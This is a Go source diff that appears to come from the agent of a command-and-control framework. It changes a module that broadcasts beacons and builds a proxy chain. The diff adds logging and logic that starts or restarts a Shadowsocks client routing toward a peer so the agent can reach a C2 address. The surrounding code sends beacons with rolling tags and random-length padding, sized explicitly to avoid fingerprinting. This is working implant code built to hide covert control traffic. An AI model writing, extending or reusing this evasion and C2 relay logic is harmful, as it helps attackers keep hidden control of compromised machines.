@@ -137,9 +137,11 @@ func BroadcastServer(ctx context.Context, cancel context.CancelFunc, port string
 			log.Printf("BroadcastServer has read nothing: %v", err)
 			continue
 		}
+		log.Printf("BroadcastServer: received %d bytes from %s", n, addr)
 
 		// Filter 1: Check length (ignore tiny runt packets < 32 bytes)
 		if n < 32 {
+			log.Printf("BroadcastServer: dropped tiny packet (%d bytes) from %s", n, addr)
 			continue
 		}
 
@@ -155,9 +157,10 @@ func BroadcastServer(ctx context.Context, cancel context.CancelFunc, port string
 		validTagNext := getRollingTag(nextSlot)
 
 		// Validate: Does the packet header match either valid tag?
-		payload := buf[:4]
-		if !bytes.Equal(payload, validTagCurrent) && !bytes.Equal(payload, validTagPrev) && !bytes.Equal(payload, validTagNext) {
-			log.Printf("BroadcastServer: dropped packet from %s due to invalid tag", addr)
+		tag := buf[:4]
+		if !bytes.Equal(tag, validTagCurrent) && !bytes.Equal(tag, validTagPrev) && !bytes.Equal(tag, validTagNext) {
+			log.Printf("BroadcastServer: dropped packet from %s. Tag: %x. Expected: %x / %x / %x. Time: %d (Slot %d)",
+				addr, tag, validTagCurrent, validTagPrev, validTagNext, now, currentSlot)
 			continue // Invalid or expired tag
 		}
 
@@ -193,15 +196,26 @@ func BroadcastServer(ctx context.Context, cancel context.CancelFunc, port string
 			}
 		}
 
+		// Check if local Shadowsocks client is running
+		if !netutil.IsPortOpen("127.0.0.1", common.RuntimeConfig.ShadowsocksLocalSocksPort) {
+			log.Printf("BroadcastServer: starting Shadowsocks client for %s", srcIP)
+			go c2transport.ShadowsocksLocalSocks(srcIP, common.RuntimeConfig.ShadowsocksLocalSocksPort)
+			// give it some time to start
+			time.Sleep(1 * time.Second)
+		}
+
 		// test proxy
 		is_proxy_ok := transport.IsProxyOK(proxy_url, def.CCAddress)
 
 		// if the proxy is not working
 		// restart Shadowsocks local socks5 proxy
 		if !is_proxy_ok {
+			log.Printf("BroadcastServer: proxy %s failed, restarting Shadowsocks client pointing to %s", proxy_url, srcIP)
+			c2transport.SS_Cancel()
+			c2transport.SS_Ctx, c2transport.SS_Cancel = context.WithCancel(context.Background())
 			go c2transport.ShadowsocksLocalSocks(srcIP, common.RuntimeConfig.ShadowsocksLocalSocksPort)
 			// give it some time to start
-			time.Sleep(200 * time.Millisecond)
+			time.Sleep(1 * time.Second)
 		}
 
 		// test proxy again
@@ -280,17 +294,21 @@ func StartBroadcast(start_socks5 bool, ctx context.Context, cancel context.Cance
 
 	for ctx.Err() == nil {
 		log.Print("Broadcasting our proxy...")
-		time.Sleep(time.Duration(util.RandInt(common.RuntimeConfig.ProxyChainBroadcastIntervalMin, common.RuntimeConfig.ProxyChainBroadcastIntervalMax)) * time.Second)
 
 		// [IMPORTANT] Generate the tag FRESH for this moment
 		timeSlot := time.Now().Unix() / 30
 		magicTag := getRollingTag(timeSlot)
+		log.Printf("StartBroadcast: sending tag %x for slot %d (Time: %d)", magicTag, timeSlot, time.Now().Unix())
 
-		// Prepare payload: 4 bytes tag + random noise (28+ bytes)
+		// Prepare payload: Tag (4 bytes) + Random (28+ bytes)
 		// Randomize packet size to avoid fingerprinting (32 to 256 bytes)
 		packetSize := util.RandInt(32, 256)
 		payload := make([]byte, packetSize)
+
+		// 1. Tag
 		copy(payload[:4], magicTag)
+
+		// 2. Random Noise
 		rand.Read(payload[4:])
 
 		ips := netutil.IPaddr()
@@ -323,5 +341,6 @@ func StartBroadcast(start_socks5 bool, ctx context.Context, cancel context.Cance
 				log.Printf("StartBroadcast: sent beacon to %s", dst)
 			}
 		}
+		time.Sleep(time.Duration(util.RandInt(common.RuntimeConfig.ProxyChainBroadcastIntervalMin, common.RuntimeConfig.ProxyChainBroadcastIntervalMax)) * time.Second)
 	}
 }
